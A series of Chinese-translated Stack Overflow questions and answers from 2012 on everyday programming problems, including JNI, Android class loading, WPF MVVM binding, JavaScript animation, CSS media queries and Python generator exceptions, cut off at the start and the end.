
                sal.add(s);
                s = new salary();
                rowCount++;
            }
        } catch (Exception e) {
            System.out.println(e);
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T13:42:00.687

例外是因为我相信您正在从其他方法调用的方法的参数中接收 ResultSet。你已经关闭了那里的连接，所以在这里你得到了这个异常。请向我们展示带有参数的完整方法

# jquery - Rails 2 的 jQuery gem 是什么？

> ID：13530243
> 
> 赞同：0
> 
> 时间：2012-11-23T13:37:31.767
> 
> 标签：jquery, ruby-on-rails, ruby-on-rails-2

我想在 Rails 2 中使用 jQuery。它需要什么 gem？

我开始知道'jquery-rails' 只能用于 Rails 3。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:39:34.440

在 Rails 中包含 jQuery 所需的 gem 是`gem "jquery-rails"`

对于以前版本的 Rails，请按照此处的“手动安装”在 Rails 2 中使用 JQuery - [https://github.com/rails/jquery-ujs](https://github.com/rails/jquery-ujs)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-11T11:00:31.000

如果你想在 rails 2.x 项目中使用 jquery，而不是原型，你将不得不使用[jRails](https://github.com/aaronchi/jrails)。

# java - 使用来自 JNI 的函数库时出错

> ID：13530251
> 
> 赞同：0
> 
> 时间：2012-11-23T13:38:11.780
> 
> 标签：java

当我运行此代码时：

```
package jni_2;

public class Min2 {

    static {
        System.loadLibrary("kernel32");
    }

    public native long FlushProcessWriteBuffers();

    public static void main(String[] args) {
        Min2 c = new Min2();
        c.FlushProcessWriteBuffers();
    }
} 
```

我得到这个例外：

```
Exception in thread "main" java.lang.UnsatisfiedLinkError: jni_2.Min2.FlushProcessWriteBuffers()J
    at jni_2.Min2.FlushProcessWriteBuffers(Native Method)
    at jni_2.Min2.main(Min2.java:14)
Java Result: 1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:04:09.267

JNI 不是这样工作的。

您似乎正在尝试加载 Windows 运行时库 ( `kernel32`) 并调用其[`FlushProcessWriteBuffers`](http://msdn.microsoft.com/en-gb/library/windows/desktop/ms683148%28v=vs.85%29.aspx)函数。你不能用 JNI 做到这一点。使用 JNI，您只能调用根据[JNI 规范](http://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/design.html)编码和链接的专门编写的本机函数。

为了`FlushProcessWriteBuffers`通过 JNI 调用，您需要用 C（或其他）编写一个与 JNI 兼容的包装函数，编译它以生成一个库，加载该库，然后进行本机调用。然后包装函数可以调用`FlushProcessWriteBuffers`.

您还可以考虑使用[JNA](https://github.com/twall/jna#readme)，它的工作方式有点像通用包装器函数，允许您调用任何本机函数而无需编写自己的包装器。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-23T14:05:58.557

看起来您正在尝试使用 JNI 调用 Windows 系统函数。

为此，您需要编写自己的 C 包装器，该包装器将符合 JNI 命名约定，并在内部调用`FlushProcessWriteBuffers()`.

或者，看看[JNA](http://en.wikipedia.org/wiki/Java_Native_Access)。

# android - Android：通过 ClassLoader 加载外部 Jar 文件

> ID：13530254
> 
> 赞同：1
> 
> 时间：2012-11-23T13:38:22.297
> 
> 标签：android, jar, classloader

我有一个需要能够加载外部 Jar 文件的 Android 应用程序。我知道罐子的位置。

我一直在玩 Android API 提供的 PathClassLoader 类，但无济于事。我在 Activity 中使用以下代码：

```
String jarPath = "/sdcard/jars/testjar.jar";

PathClassLoader myClassLoader = new PathClassLoader(jarPath, ClassLoader.getSystemClassLoader());

        try
    {
        Class<?> clazz = Class.forName("com.test.Class1", true, myClassLoader);
    }
    catch(Exception ex)
    {
        ex.printStackTrace();
    } 
```

在实例化 PathClassLoader 实例后，Dalvik 向 LogCat 打印一条消息，告诉我它找不到“classes.dex”文件。之后，“Class.forName”会抛出“ClassNotFoundException”。

我正在尝试找到一种无需“classes.dex”文件即可从外部 Jar 文件加载类的方法。Jar 文件不包含这个文件，但是当其他应用程序使用类路径中的 Jar 构建时，Dalvik 可以非常愉快地加载类。

简单地说：如何在不需要“classes.dex”的情况下从外部 Jar 文件中加载类？

非常感谢，P

**更新** Dalvik 记录的消息是

> zip很好，但是里面没有classes.dex，同一目录下也没有有效的.odex文件

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-08T12:57:05.360

有一个叫“dx”的工具，这个工具可以把Java Binary Code转换成Android Dalvik Binary code。在 Android 中，无法识别 Java 二进制代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T19:33:20.593

我发现了解决方案。也许我在发布问题时太仓促了。

当然 .dex 文件是必需的，因为这正是 Dalvik 执行的。

为了解决我的问题，我对外部 Jar 文件进行了 dex 处理，因此它们现在包含了自己的“classes.dex”。幸运的是，这是我们持续集成环境的一部分，所以一旦我们检查并构建了 Android 库，通过 dx.exe 的额外中间步骤会生成“classes.dex”并最终允许我在运行时从 Jar 加载类-时间。

# asp.net - ASP vb.net：如何动态更改绑定到中继器的列表

> ID：13530256
> 
> 赞同：0
> 
> 时间：2012-11-23T13:38:26.960
> 
> 标签：asp.net, vb.net, dynamic, repeater, itemtemplate

我想动态创建一个列表，并将其绑定到使用自定义控件的 asp 中继器。

这是我的自定义控件（.acsx 文件）：

```
<%@ Control Language="VB" ClassName="ControlCar" %>
<script runat="server">
    Private m_car As Car = Nothing
    Public Property Car() As Car
        Get
            Car= m_car
        End Get
        Set(ByVal value As Car)
            m_car = value
        End Set
    End Property

    Protected Sub Panel_OnLoad(ByVal sender As Object, ByVal e As System.EventArgs)
        If Me.m_car Is Nothing Then
            lit_color.Text = "(m_car Is Nothing)"
        Else
            lit_color.Text = "color of Me.m_car is (" & Me.m_car.Color & ")"
        End If
    End Sub

</script>

<asp:Panel ID="panel" OnLoad="Panel_OnLoad" runat="server">
    this is a car<br />
    color = <asp:Literal ID="lit_color" runat="server"></asp:Literal><br />
    <br />
</asp:Panel> 
```

所以我在我的 aspx 文件中创建了一个中继器：

```
<%@ Register TagPrefix="uc" TagName="ControlCar" Src="myfile.ascx" %>
<asp:Repeater ID="id_repeater" runat="server">
    <headertemplate>
    </headertemplate>
    <itemtemplate>  
    <uc:ControlCar id="ControlCarTemplate" Car=<%# CType(Container.DataItem, Car)%> runat="server" />
    </itemtemplate>
</asp:Repeater> 
```

声明填充中继器的列表：

```
Private Shared list_cars As ArrayList 
```

在 LoadPage 事件中，我在列表中添加一项：

```
If IsPostBack Then
    Return
End If

list_cars = New ArrayList()
Dim car As Car = New Car
car.Color = "red"
list_cars .Add(car)
id_repeater.DataSource = list_cars 
id_repeater.DataBind() 
```

当我显示页面时，我正确地看到了这个：

> 这是一辆车
> 
> color = Me.m_car 的颜色是（红色）

**好的，它在加载页面事件上工作正常**

但是现在，我想在此处定义的按钮 clic 事件上添加项目：

```
Sub OnClickAdd(ByVal sender As Object, ByVal e As System.EventArgs)
    Dim car = New Car
    car.Color = "blue"
    list_cars.Add(car)
    id_repeater_products.DataSource = list_cars
    id_repeater_products.DataBind()
End Sub 
```

在点击事件中，我现在看到：

> 这是一辆车
> 
> 颜色 = (m_car 什么都不是)
> 
> 这是一辆车
> 
> 颜色 = (m_car 什么都不是)

**它不起作用，我认为 Container.DataItem 没有什么价值，只有在加载页面时它才是好实例**

我不知道如何解决它，有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T13:48:39.777

在您的 Page_Load 上，使用`Not Page.IsPostBack`

```
If Not Page.IsPostBack Then

    list_cars = New ArrayList()
    Dim car As Car = New Car
    car.Color = "red"
    list_cars .Add(car)
    id_repeater.DataSource = list_cars 
    id_repeater.DataBind()

End If 
```

`list_cars = New ArrayList()`每当您单击该按钮时，都会发生回发，并且该列表在 Page_Load中被覆盖。

而且，asp.net 不是 Windows 应用程序，由于回发，您不能将项目添加到现有列表中，除非您将列表保存在 Session 或 ViewState 中

在页面的代码隐藏中添加此属性

```
Public Property list_cars As ArrayList

    Get
       If ViewState("list_cars") IsNot Nothing Then
          Dim list As ArrayList = CType(ViewState("list_cars"), ArrayList)
          return list
       End If

       return Nothing 'or return an empty list
    End Get

    Set
         ViewState("list_cars") = value
    End Set

End Property 
```

要在您的页面中使用它：

```
Dim updatedList As ArrayList = list_cars
updatedList.Add(car)

list_cars = updatedList 
```

# android - 我怎样才能实现这样的 UI 模式？

> ID：13530257
> 
> 赞同：1
> 
> 时间：2012-11-23T13:38:30.167
> 
> 标签：android, android-actionbar, actionbarsherlock, android-tabs

我有这样的问题。我将 actionBar(Sherlock) 与`NAVIGATION_MODE_TABS`. 在纵向模式下，它工作正常。第一个屏幕上的 FragmentA，另一个屏幕上带有选项卡的信息。

在左侧的横向模式下，我有 ListFragmentA 和项目，在右侧我有 ViewPager，项目信息分为几个选项卡（滑动片段）。（图一）

如何实现图片 B 上显示的 UI？

我有什么（图A）![在此处输入图像描述](../Images/60f9920b0d729bda0cbedabe2930cdf9.png)

我想得到什么（图B）![在此处输入图像描述](../Images/f43a4a1ae2eff5bee875578a756526bc.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:43:56.837

为此，您可以使用 ViewPager 的自定义实现，例如 Jake Wharton 的 ViewPagerIndicator。这是一个带有标签（和其他指标）的 ViewPager [https://github.com/JakeWharton/Android-ViewPagerIndicator](https://github.com/JakeWharton/Android-ViewPagerIndicator)

# ios - iOS Quartz 2D 如何将图层扩展到屏幕框架之外

> ID：13530259
> 
> 赞同：0
> 
> 时间：2012-11-23T13:38:36.883
> 
> 标签：ios, ipad, quartz-2d

这是一张图片：

![在此处输入图像描述](../Images/15b189240f78cdb411b8b68a95ef076c.png)

有没有办法将图层（您绘制的区域）扩大到更大。起初我以为 (0,0) 是中心，但似乎它是图层的起点。我计划在 (0,0) 处绘制内容，然后根据需要进行翻译。

或者，我必须在图层中心绘制任何内容（宽度/2，高度/2），然后根据需要进行翻译吗？

EDIT_01：图层的偏移量是通过平移手势识别器进行的。这是故意的，因为应用程序必须有内容平移。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:58:16.903

## 答案

> 起初我以为 (0,0) 是中心，但似乎它是图层的起点

iOS 中的 (0,0) 从图层的左上角开始，从右到下越来越大。在 OS X 中，(0,0) 从左下角开始，从右到上越来越大。

> 有没有办法扩展图层（你绘制的区域），更大

我的问题是，你需要吗？这可能会出现性能问题，因为您在不需要时渲染和存储绘图数据，从而导致使用更多内存。看起来您的图层正确填充了屏幕，只是翻译不正确。如果将其移动到正确的位置，则无需将图层扩展至屏幕外。

这**并不**意味着您不能在屏幕外翻译其他图层，当然可以。但实际上您不想扩大绘图区域的大小以扩大屏幕外。

> 我必须在图层中心绘制任何内容（宽度/2，高度/2），然后根据需要进行翻译吗？

如果您希望它们被吸引到中心，那么可以。您可以创建自己的方法将自己的坐标空间转换为图层的坐标空间，以使您更轻松。

## 文档

我建议阅读这篇文章，以更好地掌握以下几何工作`CALayer`： [https ://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/CoreAnimation_guide/Articles/Layers.html#//apple_ref /doc/uid/TP40006082-SW1](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/CoreAnimation_guide/Articles/Layers.html#//apple_ref/doc/uid/TP40006082-SW1)

...这是了解绘图技术： [https ://developer.apple.com/library/ios/#documentation/graphicsimaging/conceptual/drawingwithquartz2d/dq_layers/dq_layers.html](https://developer.apple.com/library/ios/#documentation/graphicsimaging/conceptual/drawingwithquartz2d/dq_layers/dq_layers.html)

# c# - WPF MVVM 双向更新

> ID：13530262
> 
> 赞同：0
> 
> 时间：2012-11-23T13:38:47.417
> 
> 标签：c#, wpf, mvvm, binding

[我正在尝试使用此示例](http://www.shujaat.net/2011/02/wpf-performance-improvement-for-mvvm.html)设置有效的双向更新。

这些是相关的代码片段：

XAML：

```
<Button Click="clkInit">Initialize</Button>
<Button Click="clkStudent">Add student</Button>
<Button Click="clkChangeStudent">Change students</Button>
(...)
<TabControl Name="tabControl1" ItemsSource="{Binding StudentViewModels}" >
   <TabControl.ItemTemplate>
      <DataTemplate>
         <TextBlock Text="{Binding Path=StudentFirstName}" />
      </DataTemplate>
   </TabControl.ItemTemplate>
   <TabControl.ContentTemplate>                
      <DataTemplate>
         <Grid>
            <Label Content="First Name" Name="label1" />
            <TextBox Name="textBoxFirstName" Text="{Binding Path=StudentFirstName}" />
            <Label Content="Last Name" Name="label2" />
            <TextBox Name="textBoxLastName" Text ="{Binding Path=StudentLastName}" />
         </Grid>                    
      </DataTemplate>
   </TabControl.ContentTemplate>
</TabControl> 
```

主窗口：

```
public partial class MainWindow : Window
{
    internal MainWindowViewModel myMWVM;
    public MainWindow()
    {
       InitializeComponent();
    }

    private void clkInit(object sender, RoutedEventArgs e)
    {
       myMWVM= new MainWindowViewModel();
       DataContext = myMWVM;
    }
    private void clkStudent(object sender, RoutedEventArgs e)
    {
       myMWVM.StudentViewModels.Add(new StudentViewModel());
    }
    // For testing - call a function out of the student class to make changes there
    private void clkChangeStudent(object sender, RoutedEventArgs e)
    {
       for (Int32 i = 0; i < test.StudentViewModels.Count; i++)
       {
           myMWVM.StudentViewModels.ElementAt((int)i).changeStudent();
       }
    }
} 
```

主视图：

```
class MainWindowViewModel : INotifyPropertyChanged
{
   ObservableCollection<StudentViewModel> _studentViewModels = 
        new ObservableCollection<StudentViewModel>();

   // Collection for WPF.
   public ObservableCollection<StudentViewModel> StudentViewModels
   {
      get { return _studentViewModels; }
   }

   // Constructor. Add two stude
   public MainWindowViewModel()
   {
      _studentViewModels.Add(new StudentViewModel());
      _studentViewModels.Add(new StudentViewModel());
   }

   // Property change.
   public event PropertyChangedEventHandler PropertyChanged;
   private void OnPropertyChanged(string propertyName)
   {
      if (PropertyChanged != null)
      {
         PropertyChanged(this, new PropertyChangedEventArgs(propertyName));
      }
   }
} 
```

学生观点：

```
class StudentViewModel : INotifyPropertyChanged
{
   Lazy<Student> _model;

   string _studentFirstName;
   public string StudentFirstName
   {
      get { return _studentFirstName; }
      set
      {
         if (_studentFirstName != value)
         {
            _studentFirstName = value;
            _model.Value.StudentFirstName = value;
            OnPropertyChanged("StudentFirstName");
         }
      }
   }

   string _studentLastName;
   public string StudentLastName
   {
      get { return _studentLastName; }
      set
      {
         if (_studentLastName != value)
         {
            _studentLastName = value;
            _model.Value.StudentLastName = value;
            OnPropertyChanged("StudentLastName");
         }
      }
   }

   public void changeStudent()
   {
      _model.Value.changeStudent();
   }

   public StudentViewModel()
   {
      _studentFirstName = "Default";
      _model = new Lazy<Student>(() => new Student());
   }

   public event PropertyChangedEventHandler PropertyChanged;
   private void OnPropertyChanged(string propertyName)
   {
      if (PropertyChanged != null)
      {
         PropertyChanged(this, new PropertyChangedEventArgs(propertyName));
      }
   }
} 
```

学生：

```
class Student
{
   public string StudentFirstName { get; set; }
   public string StudentLastName { get; set; }

   public Student()
   {
      MessageBox.Show("Student constructor called");
   }
   public Student(string nm)
   {
      StudentLastName = nm;
   }
   public void changeStudent()
   {
      StudentLastName = "McDonald";
   }
} 
```

如果你读到这里，我已经谢谢你了 :) 不过，通过调用“clkChangeStudent”，我看不到文本框中的变化。我猜是因为我没有调用 StudentViewModel 的 set-method。我正在做的项目有点复杂，很多事情发生在课堂（这里是学生）本身。

如何通过 Student-class 本身的设置值更新文本框？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T14:24:56.280

您的实际代码显然不会通知界面的更改。原因很简单。您更改学生姓名的方法位于 Student 模型中，并且该模型未实现 INotifyPropertyChanged。

根据一个问题，有两种解决方案可以解决此问题，changeStudent() 方法是否必须坚持对象模型，也就是说，您的要求是否允许您将 changeStudent() 方法移至视图模型？

如果是那么，**第一个解决方案**，只需从模型中删除 changeStudent 方法并将其移动到视图模型，如下所示：

```
class StudentViewModel : INotifyPropertyChanged
{
    ...

    public void changeStudent()
    {
        this.StudentLastName = "McDonald";
    }
} 
```

在另一种情况下，**第二种解决方案**，您必须在模型属性更改时引发事件，然后让您的视图模型订阅这些更改。您可以在模型中这样进行：

```
class Student : INotifyPropertyChanged
{
    ...

    private string studentLastName;

    public string StudentLastName
    {
        get
        {
            return this.studentLastName;
        }

        set
        {
            if(this.studentLastname != value)
            {
                this.studentLastName = value;
                this.OnPropertyChanged("StudentLastName");
            }
        }
    }
} 
```

对于视图模型：

```
class StudentViewModel : INotifyPropertyChanged
{
    ...

    public StudentViewModel(Student model)
    {
        this._model = model;

        this._model.PropertyChanged += (sender, e) =>
        {
            if(e.PropertyName == "StudentLastName")
            {
                this.OnPropertyChanged("StudentLastName");
            }
        };
    }
} 
```

两种解决方案都可以。真正重要的是，您了解您的代码**明确**需要在值更改时通知接口。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:43:51.357

ChangeStudent 不会调用在视图模型中触发属性通知事件的任何方法，而是更改底层模型。正是这些事件触发了视图进行自我更新。

顺便说一句，您还应该从视图中查看命令绑定，而不是在代码隐藏中使用单击处理程序。这样，您的视图就不需要了解附加的视图模型的任何信息，并且可以是纯粹的呈现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T13:53:07.603

首先，您应该使用命令而不是事件。

在您当前的结构中，您必须添加一个

```
OnPropertyChanged("StudentLastName"); 
```

调用 StudentViewModel 中的 ChangedStudent() 方法。之后，您必须将 Bindings 的 UpdateSourceTrigger 设置为 PropertyChanged

```
Text="{Binding Path=StudentFirstName, UpdateSourceTrigger=PropertyChanged}" 
```

# javascript - Javascript：控制图像的移动速度

> ID：13530267
> 
> 赞同：2
> 
> 时间：2012-11-23T13:39:02.577
> 
> 标签：javascript, image, move

我是初学者，目前我可以将图像从左向右移动，并且可以在移动完成后将其转回初始点。我想做的也是控制图像的速度。为了做到这一点，我尝试了以下代码：

```
<script type="text/javascript">
    var userWidth = window.screen.width;

    function moveRight(speed) {
        var pp = document.getElementById("myimage");
        var lft = parseInt(pp.style.left);
        var tim = setTimeout("moveRight()", speed);
        lft = lft + 50;
        pp.style.left = lft + "px"
        if (lft > (userWidth) + 80) {
            document.getElementById("myimage").style.left = 100 + "px";
            clearTimeout(tim);
        }

    }
</script> 
```

和html：

```
<form>
    <input type="button" value="Speed 1" onclick="moveRight(50)"  />
    <input type="button" value="Speed 2" onclick="moveRight(25)"  />
    <input type="button" value="Speed 3" onclick="moveRight(10)" />
</form> 
```

**我的问题：**当我单击三个按钮中的任何一个时没有区别。图像始终以相同的速度移动，并且看起来按钮无法控制速度。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:15:56.517

您上面的代码没有任何速度逻辑。您唯一要做的就是延迟动画开始之前的时间：

```
var tim = setTimeout("moveRight()", speed); 
```

对等待属性（速度）的函数进行递归调用也是不行的。

我设置了一个快速小提琴来演示 jquery 动画速度：

[http://jsfiddle.net/yeQtB/](http://jsfiddle.net/yeQtB/)

要在动画中实现速度，有两种可能性：

• 循环逻辑：您承认您可以使用循环而不是秒，然后只需创建一个 for 循环，该循环将迭代直到动画结束。**编辑：**这只是为了解释

• 时间逻辑 你有一个距离和一个时间范围（以秒为单位），将距离除以时间范围，它给你步数，将距离除以步数，它会给你步数，那么这只是一个问题在循环中每秒触发一次 settimeout。**编辑：**如果您实现了这一点并且渴望获得更流畅的东西，我建议您查看 requestAnimationFrame HTML5 Api：

[http://paulirish.com/2011/requestanimationframe-for-smart-animating/](http://paulirish.com/2011/requestanimationframe-for-smart-animating/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:21:50.077

您在原始代码中犯的错误是，当您再次调用该函数时，您没有将 speed 值传递给它，这意味着唯一发生的事情是第一个动画被延迟了。

尝试用此行替换调用，然后您的代码应该可以工作。

```
var tim = setTimeout("moveRight("+speed+")", speed); 
```

有了这个，你仍然可以在不使用 Jquery 的情况下做到这一点

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T14:23:34.673

您必须将变量传递`speed`给`moveRight`：`setTimeout`

```
var userWidth = window.screen.width,
    tim,
    pp = document.getElementById("myimage"); // You should cache your variables

function moveRight(speed) {
    var lft = parseInt(pp.style.left) || 0;

    tim = setTimeout("moveRight(" + speed + ")"); // Here you have to pass speed as a parameter
    lft = lft + speed; // Here I guess it is speed rather than 50
    pp.style.left = lft + "px"
    if (lft > (userWidth) + 80) {
        pp.style.left = 100 + "px";
        clearTimeout(tim);
    }
} 
```

# mysql - mysql.h 中的错误

> ID：13530268
> 
> 赞同：0
> 
> 时间：2012-11-23T13:39:04.383
> 
> 标签：mysql, c, gcc, cygwin, dev-c++

当我在源文件中包含 mysql.h 时，会出现各种语法错误。我正在使用 cygwin gcc 编译器和 Mysql Windows Connector 6.0.2。我添加了我的 IDE 的图像。我能做些什么来解决这个问题？[点击显示大图](https://i.stack.imgur.com/fOHw0.png)

![在此处输入图像描述](../Images/2d930db08fe7d150069c9d97fa67c2c8.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:42:49.363

你需要`winsock`在mysql之前包含。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:44:22.763

尝试在 mysql 标头之前包含标头 winsock.h。

# javascript - 从变量中删除#

> ID：13530271
> 
> 赞同：0
> 
> 时间：2012-11-23T13:39:31.197
> 
> 标签：javascript, string

我有这个脚本：

```
<a href="#extensive" class="forward next-content">Menu item</a> 
```

我无法编辑 html。只有js。这是我的js：

```
// Click
$('.next-content').click(function() {
    var url = $(this).attr('href');

    console.log(url);
}); 
```

当我点击一个按钮。我得到了变量。变量中的 href。变量是#extensive。但是，我怎样才能从变量中删除#？

感谢帮助

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T13:41:18.487

```
var url = $(this).attr('href').substring(1); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:41:50.463

您可以替换“#”字符

```
url.replace('#','') 
```

或子串

```
url.substring(1) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T13:42:30.150

你不能就这样吗

```
// Click
$('.next-content').click(function() {
    var url = $(this).attr('href');
    url=url.replace("#","");
    console.log(url);
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T13:42:37.043

你可以很容易地谷歌它...

```
var url = $(this).attr('href').substr(1); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-23T13:47:55.950

我真的不确定。 [这可能会有所帮助。](https://stackoverflow.com/questions/4029201/javascript-hash-replace-error)我会说替换将是你最好的选择：

```
url.replace('#', ''); 
```

# javascript - 寻找媒体查询生成器

> ID：13530283
> 
> 赞同：2
> 
> 时间：2012-11-23T13:40:25.510
> 
> 标签：javascript, css, responsive-design, media-queries

我希望我的页面可以缩放以适应所有设备上所有可能的屏幕，所以我使用了一个想法来改变`em`根元素的大小。所有子元素的大小都在`em`;

调整页面大小和缩放也应该得到很好的支持。

我目前有 200 行这样有趣的 CSS 代码：

```
 .........
@media (max-width: 400px) {
     #vb { font-size: .8px}
}
@media (max-width: 350px) {
     #vb { font-size: .7px}
}
@media (max-width: 320px) {
     #vb { font-size: .64px}
}
       ......... 
```

我想要求一个可以自动生成此代码的漂亮库。

我确信这个巨大的 css 代码应该在前端生成，因为这 200 - 1000 行会消耗千字节。

**PS**：我的方法的正确性如何？

* * *

解决方案可能是：

*   如果我通过 JavaScript 计算页面大小并只输入两行代码，例如：

    var fontSize = calculateFS(); $('#vb').style({sizeSize: fontSize});

如果我们不打算调整窗口大小或放大，则此代码效果很好。但如果我要捕捉 onzoom 或 onresize 事件，界面就会出现严重滞后。

*   社区还有其他想法吗？

感谢您的关注

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:01:29.113

为什么不考虑使用响应式排版`rems`？

[本文](http://www.webdesignerdepot.com/2012/10/a-simple-guide-to-responsive-typography/)更详细地解释了这一点。一个简短的摘录：

```
@media (max-width: 640px) { body {font-size:1.2rem;} }
@media (min-width: 640px) { body {font-size:1rem;} }
@media (min-width: 960px) { body {font-size:1.2rem;} }
@media (min-width: 1100px){ body {font-size:1.5rem;} } 
```

这似乎是比使用 em 或像素更好的选择，因为`rems`它们是相对于`body`元素而不是父元素的。

我可能误解了这一点，但您似乎不需要使用这么多媒体查询，甚至根本不需要使用任何 JS。

如果您只想保持媒体查询的可维护性，或许可以考虑使用 Compass 和 Sass？[http://css-tricks.com/media-queries-sass-3-2-and-codekit/](http://css-tricks.com/media-queries-sass-3-2-and-codekit/)

# blackberry - 从 url 播放 mp3 文件（大小大于 2Mb）抛出错误 413

> ID：13530285
> 
> 赞同：2
> 
> 时间：2012-11-23T13:40:31.117
> 
> 标签：blackberry

我有一个 mp3 文件的网址。我想使用 Player(javax.microedition.media.Player) 播放它而不将 mp3 文件下载到 SD 卡。当我尝试以下代码时，它抛出错误 413-请求的实体太大。

```
 String httpURL1="http://www.example.com/song.mp3";
  Player player;
  player =Manager.createPlayer(httpURL1);
  player.realize();
  player.prefetch();
  player.start(); 
```

如何解决这个问题呢 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T10:23:30.640

413（请求实体太大）是当您尝试通过其传输大文件时 BES 或 BIS 返回的 HTTP 错误。

检查以下链接：

[什么是 - HTTP 413 请求实体太大 (DB-00623)](http://supportforums.blackberry.com/t5/Java-Development/HTTP-413-Request-Entity-Too-Large/ta-p/445983)

[如何 - 使用 BlackBerry Mobile Data System 下载大文件 (DB-00619)](http://supportforums.blackberry.com/t5/Java-Development/Download-large-files-using-the-BlackBerry-Mobile-Data-System/ta-p/445858)

这个限制是为了防止过多的流量通过 RIM 的基础设施或公司 BES（在 BES 中，您可以要求 BES 管理员在一定程度上增加最大大小，但这不是较大文件的解决方案，或者如果 BES 是不受你控制）。但是你总是可以在直接 TCP 模式下打开连接，或者通过 Wi-Fi，你会没事的。

[我在这里](https://stackoverflow.com/a/9737006/813951)发布了类似的答案。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-25T06:04:15.550

播放 Mp3 文件而不将其保存到 SD 卡中创建播放器

```
UiApplication.getUiApplication().invokeLater(new Runnable()
    {
        public void run() 
        {
            try
            {
                _player = Manager.createPlayer(url);
                _player.realize();*/
            }
            catch (Exception ex)
            {
                Dialog.alert("Streaming player is not intialized due to network failure !");
                //Dialog.alert("Error is " + ex.toString());
            }       
        }
    });
_player.start(); 
```

在 UI 线程而不是在主线程中创建和实现它。

还要确定网络层，请参阅此链接以添加 httpURL1

[http://supportforums.blackberry.com/t5/Java-Development/Different-ways-to-make-an-HTTP-or-socket-connection/ta-p/445879](http://supportforums.blackberry.com/t5/Java-Development/Different-ways-to-make-an-HTTP-or-socket-connection/ta-p/445879)

# python - 在生成器中捕获异常时保持 try 块较小

> ID：13530290
> 
> 赞同：5
> 
> 时间：2012-11-23T13:40:39.383
> 
> 标签：python, exception, generator, except

当我必须捕获生成器中可能发生的异常时，如何使 try 块尽可能小？

一个典型的情况是这样的：

```
for i in g():
  process(i) 
```

如果`g()`可以引发我需要捕获的异常，第一种方法是：

```
try:
  for i in g():
    process(i)
except SomeException as e:
  pass  # handle exception ... 
```

但这也会捕获`SomeException`它是否发生`process(i)`（这是我不想要的）。

是否有处理这种情况的标准方法？某种模式？

我正在寻找的是这样的：

```
try:

  for i in g():

except SomeException as e:
  pass  # handle exception ...

    process(i) 
```

（但这当然是句法废话。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T13:48:17.573

您可以转换内部块中发生的异常：

```
class InnerException(Exception):
  pass

try:
  for i in g():
    try:
      process(i)
    except Exception as ex:
      raise InnerException(ex)
except InnerException as ex:
  raise ex.args[0]
except SomeException as e:
  pass  # handle exception ... 
```

另一种选择是编写一个包装的本地生成器`g`：

```
def safe_g():
  try:
    for i in g():
      yield i
  except SomeException as e:
    pass  # handle exception ...
for i in safe_g():
  process(i) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T14:02:44.617

直接的方法似乎是将`for`构造解包（由于其语法，这使得不可能仅在生成器中捕获异常）到其组件中。

```
gen = g()
while True:
  try:
    i = gen.next()
  except StopIteration:
    break
  process(i) 
```

现在我们可以将我们预期的异常添加到`try`块中：

```
gen = g()
while True:
  try:
    i = gen.next()
  except StopIteration:
    break
  except SomeException as e:
    pass  # handle exception ...
    break
  process(i) 
```

那（除了丑陋之外）有缺点吗？还有更多：有更好的解决方案吗？

（我不会接受我自己的答案，因为它很丑陋，但也许其他人喜欢并支持它。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T13:42:31.490

在您的生成器中引发不同类型的异常，您将能够区分。

```
class GeneratorError(Exception):
    pass

def g():
    try:
        yield <smth>
    except:
        raise GeneratorError

try:
  for i in g():
    process(i)
except GeneratorError:
    pass  # handle generator error
except SomeException as e:
  pass  # handle exception . 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T13:52:54.413

不知道行不行 你可以评估`g()`成一个列表。我无法测试它，因为我手头没有抛出异常的迭代器。

```
try:
    glist = list(g())
except SomeException as e:
    pass  # handle exception ...
for i in glist:
    process(i) 
```

# php - 单列 CSV 到两列 MySql 表数据存储

> ID：13530291
> 
> 赞同：0
> 
> 时间：2012-11-23T13:40:40.907
> 
> 标签：php, mysql, sorting, csv

我有一个 csv 文件，它在一列中包含 2000 个数据。数据格式如下：

```
name 100/1
name 100/2
name 105/6 
 ... 
```

所以一般格式是'text integer_one/integer_two' 现在我希望它存储在一个有 2 列的 mysql 数据库表中。column_1 应该有数据 integer_one，column_2 应该有数据 integer_two

如何使用 php 将数据推送到 mysql 中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T13:45:44.910

看看 preg_match，你应该能够使用一个相当简单的正则表达式来获取这些值，比如：

```
preg_match(/\w+\s*(\d+)\\\/(\d+)/, $row, $matches);
